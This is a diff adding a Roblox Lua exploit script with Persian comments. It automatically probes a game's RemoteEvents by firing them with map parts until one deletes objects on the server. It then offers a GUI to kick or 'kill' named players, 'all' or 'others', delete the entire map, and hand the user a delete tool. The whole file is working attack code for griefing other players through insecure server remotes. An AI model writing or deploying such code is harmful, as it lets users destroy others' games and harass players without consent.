@@ -1,0 +1,458 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local mouse = player:GetMouse()
+local selectedRemote = nil
+
+-- =====================================
+-- ساخت GUI اصلی (طراحی فشرده و استاندارد)
+-- =====================================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "MasterpieceScannerAdmin"
+ScreenGui.ResetOnSpawn = false
+
+local function getGuiParent()
+    if gethui then
+        return gethui()
+    elseif CoreGui and pcall(function() local _ = CoreGui.Name end) then
+        return CoreGui
+    else
+        return player:WaitForChild("PlayerGui")
+    end
+end
+ScreenGui.Parent = getGuiParent()
+
+-- لیبل وضعیت اسکن
+local ScanLabel = Instance.new("TextLabel")
+ScanLabel.Size = UDim2.new(0, 300, 0, 50)
+ScanLabel.Position = UDim2.new(0.5, -150, 0.5, -25)
+ScanLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+ScanLabel.TextColor3 = Color3.fromRGB(255, 170, 0)
+ScanLabel.Text = "Collecting Remotes..."
+ScanLabel.Font = Enum.Font.GothamBold
+ScanLabel.TextSize = 16
+ScanLabel.Parent = ScreenGui
+Instance.new("UICorner", ScanLabel).CornerRadius = UDim.new(0, 8)
+
+-- فریم اصلی پنل (سایز ثابت و کوچک 420x240)
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 420, 0, 240)
+MainFrame.Position = UDim2.new(0.5, -210, 0.5, -120) -- کاملا وسط صفحه
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Visible = false
+MainFrame.Parent = ScreenGui
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)
+
+-- سیستم درگ سازگار با تاچ و ماوس
+local function dragify(Frame)
+    local dragToggle, dragInput, dragStart, startPos
+    local function updateInput(input)
+        local Delta = input.Position - dragStart
+        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+        TweenService:Create(Frame, TweenInfo.new(0.12), {Position = Position}):Play()
+    end
+    Frame.InputBegan:Connect(function(input)
+        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
+            dragToggle = true; dragStart = input.Position; startPos = Frame.Position
+            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragToggle = false end end)
+        end
+    end)
+    Frame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragToggle then updateInput(input) end
+    end)
+end
+dragify(MainFrame)
+
+-- عنوان بالای پنل
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size = UDim2.new(1, 0, 0, 30)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "Selected: None"
+StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
+StatusLabel.TextSize = 16
+StatusLabel.Font = Enum.Font.SourceSansBold
+StatusLabel.Parent = MainFrame
+
+-- کانتینر دو بخش (چپ و راست)
+local ContentContainer = Instance.new("Frame")
+ContentContainer.Size = UDim2.new(1, -20, 1, -40)
+ContentContainer.Position = UDim2.new(0, 10, 0, 30)
+ContentContainer.BackgroundTransparency = 1
+ContentContainer.Parent = MainFrame
+
+-- ====================
+-- ستون سمت چپ (Target)
+-- ====================
+local LeftFrame = Instance.new("Frame")
+LeftFrame.Size = UDim2.new(0.48, 0, 1, 0)
+LeftFrame.Position = UDim2.new(0, 0, 0, 0)
+LeftFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+LeftFrame.BorderSizePixel = 0
+LeftFrame.Parent = ContentContainer
+Instance.new("UICorner", LeftFrame).CornerRadius = UDim.new(0, 6)
+
+local LeftTitle = Instance.new("TextLabel")
+LeftTitle.Size = UDim2.new(1, 0, 0, 25)
+LeftTitle.BackgroundTransparency = 1
+LeftTitle.Text = "- Target Actions -"
+LeftTitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+LeftTitle.TextSize = 14
+LeftTitle.Font = Enum.Font.GothamBold
+LeftTitle.Parent = LeftFrame
+
+local KickTextBox = Instance.new("TextBox")
+KickTextBox.Size = UDim2.new(1, -20, 0, 35)
+KickTextBox.Position = UDim2.new(0, 10, 0, 35)
+KickTextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+KickTextBox.BorderSizePixel = 0
+KickTextBox.Text = ""
+KickTextBox.PlaceholderText = "Name/All/Others"
+KickTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+KickTextBox.Font = Enum.Font.SourceSans
+KickTextBox.TextSize = 16
+KickTextBox.Parent = LeftFrame
+Instance.new("UICorner", KickTextBox).CornerRadius = UDim.new(0, 4)
+
+local KickBtn = Instance.new("TextButton")
+KickBtn.Size = UDim2.new(1, -20, 0, 35)
+KickBtn.Position = UDim2.new(0, 10, 0, 80)
+KickBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+KickBtn.Text = "Kick / Nuke"
+KickBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+KickBtn.TextSize = 15
+KickBtn.Font = Enum.Font.GothamBold
+KickBtn.Parent = LeftFrame
+Instance.new("UICorner", KickBtn).CornerRadius = UDim.new(0, 4)
+
+local KillBtn = Instance.new("TextButton")
+KillBtn.Size = UDim2.new(1, -20, 0, 35)
+KillBtn.Position = UDim2.new(0, 10, 0, 125)
+KillBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
+KillBtn.Text = "Kill Target"
+KillBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+KillBtn.TextSize = 15
+KillBtn.Font = Enum.Font.GothamBold
+KillBtn.Parent = LeftFrame
+Instance.new("UICorner", KillBtn).CornerRadius = UDim.new(0, 4)
+
+-- ====================
+-- ستون سمت راست (Global)
+-- ====================
+local RightFrame = Instance.new("Frame")
+RightFrame.Size = UDim2.new(0.48, 0, 1, 0)
+RightFrame.Position = UDim2.new(0.52, 0, 0, 0)
+RightFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+RightFrame.BorderSizePixel = 0
+RightFrame.Parent = ContentContainer
+Instance.new("UICorner", RightFrame).CornerRadius = UDim.new(0, 6)
+
+local RightTitle = Instance.new("TextLabel")
+RightTitle.Size = UDim2.new(1, 0, 0, 25)
+RightTitle.BackgroundTransparency = 1
+RightTitle.Text = "- Server Actions -"
+RightTitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+RightTitle.TextSize = 14
+RightTitle.Font = Enum.Font.GothamBold
+RightTitle.Parent = RightFrame
+
+local BtoolsBtn = Instance.new("TextButton")
+BtoolsBtn.Size = UDim2.new(1, -20, 0, 35)
+BtoolsBtn.Position = UDim2.new(0, 10, 0, 35)
+BtoolsBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+BtoolsBtn.Text = "Give Btools"
+BtoolsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+BtoolsBtn.TextSize = 15
+BtoolsBtn.Font = Enum.Font.GothamBold
+BtoolsBtn.Parent = RightFrame
+Instance.new("UICorner", BtoolsBtn).CornerRadius = UDim.new(0, 4)
+
+local DeleteMapBtn = Instance.new("TextButton")
+DeleteMapBtn.Size = UDim2.new(1, -20, 0, 35)
+DeleteMapBtn.Position = UDim2.new(0, 10, 0, 80)
+DeleteMapBtn.BackgroundColor3 = Color3.fromRGB(230, 100, 0)
+DeleteMapBtn.Text = "Delete Map"
+DeleteMapBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+DeleteMapBtn.TextSize = 15
+DeleteMapBtn.Font = Enum.Font.GothamBold
+DeleteMapBtn.Parent = RightFrame
+Instance.new("UICorner", DeleteMapBtn).CornerRadius = UDim.new(0, 4)
+
+-- =====================================
+-- توابع منطقی (بدون تغییر نسبت به نسخه اصلی)
+-- =====================================
+
+local function isValidMapPart(obj)
+    if not obj:IsA("BasePart") or obj:IsA("Terrain") then return false end
+    if obj.Name:lower() == "baseplate" then return false end
+    if obj.Transparency >= 1 then return false end
+    if obj.Size.Magnitude > 30 then return false end
+    local ancestorModel = obj:FindFirstAncestorOfClass("Model")
+    if ancestorModel and ancestorModel:FindFirstChildOfClass("Humanoid") then
+        return false
+    end
+    return true
+end
+
+local function GetTestableMapParts()
+    local candidates = {}
+    for _, obj in ipairs(Workspace:GetDescendants()) do
+        if isValidMapPart(obj) then
+            table.insert(candidates, obj)
+        end
+    end
+    return candidates
+end
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local Stats = game:GetService("Stats")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- تابع محاسبه پینگ لحظه‌ای برای جلوگیری از باگ اینترنت
+local function getNetworkDelay()
+    local ping = 0.15
+    pcall(function()
+        ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000
+    end)
+    -- حداقل 0.5 ثانیه و حداکثر 2 ثانیه مهلت بر اساس پینگ
+    return math.clamp(ping * 2.5, 0.5, 2.0)
+end
+
+local function AutoScan()
+    local remotes = {}
+    
+    local function gather(parent)
+        if not parent then return end
+        for _, v in ipairs(parent:GetDescendants()) do
+            if v:IsA("RemoteEvent") then 
+                table.insert(remotes, v) 
+            end
+        end
+    end
+
+    pcall(function() gather(ReplicatedStorage) end)
+    pcall(function() gather(Workspace) end)
+    pcall(function() gather(LocalPlayer) end)
+
+    -- ۱. جداسازی و اولویت‌بندی ایمن ریموت‌های Dance و Emote
+    local priorityRemotes = {}
+    local otherRemotes = {}
+
+    for _, remote in ipairs(remotes) do
+        local nameLower = string.lower(remote.Name)
+        if string.find(nameLower, "delete") or string.find(nameLower, "destroy") then
+            table.insert(priorityRemotes, remote)
+        else
+            table.insert(otherRemotes, remote)
+        end
+    end
+
+    -- ادغام دو لیست (ابتدا اولویت‌دارها، سپس مابقی)
+    remotes = {}
+    for _, r in ipairs(priorityRemotes) do table.insert(remotes, r) end
+    for _, r in ipairs(otherRemotes) do table.insert(remotes, r) end
+
+    local mapParts = GetTestableMapParts()
+    if not mapParts or #mapParts == 0 then
+        ScanLabel.Text = "No valid map parts found!"
+        task.wait(2)
+        return nil
+    end
+
+    local totalRemotes = #remotes
+    local foundRemote = nil
+
+    for index, remote in ipairs(remotes) do
+        if #mapParts == 0 then break end
+        
+        local targetPart = table.remove(mapParts, 1)
+        if not targetPart or not targetPart.Parent then continue end
+
+        ScanLabel.Text = string.format("Scanning [%d/%d]\n%s", index, totalRemotes, remote.Name)
+
+        pcall(function() remote:FireServer(targetPart) end)
+
+        -- ۲. تنظیم زمان انتظار بازتر (بین ۱.۰ تا ۳.۵ ثانیه) جهت پاسخ‌دهی سرورهای کند
+        local maxWait = math.clamp(getNetworkDelay() * 1.8, 1.0, 3.5)
+        local startTime = os.clock()
+
+        while (os.clock() - startTime) < maxWait do
+            if not targetPart:IsDescendantOf(Workspace) or targetPart.Parent == nil then
+                -- تاییدیه مجدد با مکث کوتاه برای جلوگیری از پاسخ کاذب ناشی از لگ
+                task.wait(0.1)
+                if not targetPart:IsDescendantOf(Workspace) then
+                    foundRemote = remote
+                    break
+                end
+            end
+            task.wait(0.05)
+        end
+
+        if foundRemote then break end
+        task.wait(0.03)
+    end
+    
+    return foundRemote
+end
+
+-- اجرای اسکن ایمن
+task.spawn(function()
+    task.wait(0.5)
+    local vulnerableRemote = AutoScan()
+    
+    if vulnerableRemote then
+        selectedRemote = vulnerableRemote
+        ScanLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
+        ScanLabel.Text = "Found Remote:\n" .. vulnerableRemote.Name
+        task.wait(1.5)
+        ScanLabel.Visible = false
+        StatusLabel.Text = "Selected: " .. vulnerableRemote.Name
+        MainFrame.Visible = true
+    else
+        ScanLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+        ScanLabel.Text = "No Vulnerable Remote Found!"
+        task.wait(2.5)
+        if ScreenGui then ScreenGui:Destroy() end
+    end
+end)
+
+local function getPlayer(name)
+    name = name:lower()
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Name:lower():sub(1, #name) == name or p.DisplayName:lower():sub(1, #name) == name then 
+            return p 
+        end
+    end
+    return nil
+end
+
+local function KickTarget(targetPlayer)
+    if selectedRemote and targetPlayer then
+        pcall(function()
+            selectedRemote:FireServer(targetPlayer)
+            if targetPlayer.Character then 
+                selectedRemote:FireServer(targetPlayer.Character) 
+            end
+        end)
+    end
+end
+
+local function KillTarget(targetPlayer)
+    if selectedRemote and targetPlayer and targetPlayer.Character then
+        local char = targetPlayer.Character
+        local partToDestroy = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart") or char:FindFirstChildOfClass("BasePart")
+        if partToDestroy then
+            pcall(function()
+                selectedRemote:FireServer(partToDestroy)
+            end)
+        end
+    end
+end
+
+-- دکمه کیک
+KickBtn.MouseButton1Click:Connect(function()
+    local targetText = string.lower(KickTextBox.Text)
+    if targetText == "" then return end
+
+    if targetText == "all" then
+        for _, p in pairs(Players:GetPlayers()) do KickTarget(p) end
+    elseif targetText == "others" then
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= player then KickTarget(p) end
+        end
+    else
+        local targetPlayer = getPlayer(targetText)
+        if targetPlayer then
+            KickTarget(targetPlayer)
+        end
+    end
+end)
+
+-- دکمه کیل (آماده برای اسپم)
+KillBtn.MouseButton1Click:Connect(function()
+    local targetText = string.lower(KickTextBox.Text)
+    if targetText == "" then return end
+
+    if targetText == "all" then
+        for _, p in pairs(Players:GetPlayers()) do KillTarget(p) end
+    elseif targetText == "others" then
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= player then KillTarget(p) end
+        end
+    else
+        local targetPlayer = getPlayer(targetText)
+        if targetPlayer then
+            KillTarget(targetPlayer)
+        end
+    end
+end)
+
+DeleteMapBtn.MouseButton1Click:Connect(function()
+    if not selectedRemote then return end
+    DeleteMapBtn.Text = "Deleting..."
+    
+    task.spawn(function()
+        -- گرفتن تمام آبجکت‌های داخل مپ بازی
+        local allObjects = workspace:GetDescendants()
+        
+        for i, obj in ipairs(allObjects) do
+            -- چک می‌کنیم که حتما پارت یا مدل باشه (چیزای اصلی مپ)
+            if (obj:IsA("BasePart") or obj:IsA("Model")) and obj.Parent then
+                pcall(function() 
+                    selectedRemote:FireServer(obj) 
+                end)
+            end
+            
+            -- بهینه‌سازی بسیار مهم: هر 100 پارت یه مکث خیلی کوتاه می‌کنه
+            -- تا کلاینتت فریز نشه و سرور هم تو رو به خاطر اسپم ریموت کیک نکنه
+            if i % 500 == 0 then
+                task.wait()
+            end
+        end
+        
+        DeleteMapBtn.Text = "Map Deleted!"
+        task.wait(1.5)
+        DeleteMapBtn.Text = "Delete Map"
+    end)
+end)
+
+BtoolsBtn.MouseButton1Click:Connect(function()
+    local tool = Instance.new("Tool")
+    tool.Name = "Delete Tool"
+    tool.RequiresHandle = false
+    tool.TextureId = "rbxasset://Textures/Hammer.png"
+    tool.Parent = player:WaitForChild("Backpack")
+    
+    tool.Activated:Connect(function()
+        local targetPart = mouse.Target
+        if targetPart and selectedRemote then
+            pcall(function() selectedRemote:FireServer(targetPart) end)
+            
+            local sel = Instance.new("SelectionBox")
+            sel.Adornee = targetPart
+            sel.Color3 = Color3.fromRGB(255, 0, 0)
+            sel.LineThickness = 0.05
+            sel.Parent = targetPart
+            
+            local exp = Instance.new("Explosion")
+            exp.Position = mouse.Hit.Position
+            exp.BlastPressure = 0
+            exp.BlastRadius = 0
+            exp.Parent = Workspace
+            
+            task.delay(0.15, function() if sel then sel:Destroy() end end)
+        end
+    end)
+end)
